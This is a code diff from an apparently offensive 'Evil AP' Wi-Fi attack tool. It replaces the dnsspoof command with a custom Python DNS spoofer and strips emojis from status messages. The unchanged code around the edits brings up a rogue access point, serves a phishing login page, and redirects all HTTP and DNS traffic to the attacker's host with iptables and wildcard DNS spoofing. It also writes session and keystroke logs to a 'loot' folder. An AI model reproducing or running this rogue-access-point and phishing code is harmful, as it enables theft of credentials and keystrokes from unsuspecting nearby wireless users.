@@ -265,21 +265,19 @@ log-dhcp
     subprocess.Popen(["sudo", "hostapd", "loot/hostapd.conf"])
     time.sleep(2)
 
-    print("🧠 Launching dnsmasq...")
+    print("Launching dnsmasq...")
     subprocess.Popen(["sudo", "dnsmasq", "-C", "loot/dnsmasq.conf"])
 
-    print("💻 Hosting phishing login at http://10.0.0.1 ...")
+    print("Hosting phishing login at http://10.0.0.1 ...")
     subprocess.Popen(["sudo", "python3", "phish_server.py"])
 
-    print("🔀 Enabling HTTP redirection with iptables...")
+    print("Enabling HTTP redirection with iptables...")
     subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
 
-    print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
-    with open("loot/dnsspoof_hosts", "w") as f:
-        f.write("10.0.0.1 *\n")
-    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "loot/dnsspoof_hosts"])
+    print("Launching JamFi DNS spoofer...")
+    subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
 
     print("Press CTRL+C to stop Evil AP.")
     try:
@@ -393,19 +391,21 @@ setTimeout(() => {{
     with open("loot/dnsspoof_hosts", "w") as f:
         f.write("10.0.0.1 *\n")
 
-    # ✅ Serve from loot/
+    # Serve from loot/
     os.chdir("loot")
     open(session_log, "a").close()
     open(keystroke_log, "a").close()
 
-    print(f"📶 Broadcasting SSID: {fake}")
+    print(f"Broadcasting SSID: {fake}")
     subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
     time.sleep(2)
     subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
-    subprocess.Popen(["sudo", "dnsspoof", "-i", iface, "-f", "dnsspoof_hosts"])
+    print("Starting Python DNS spoofer...")
+    subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
+
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
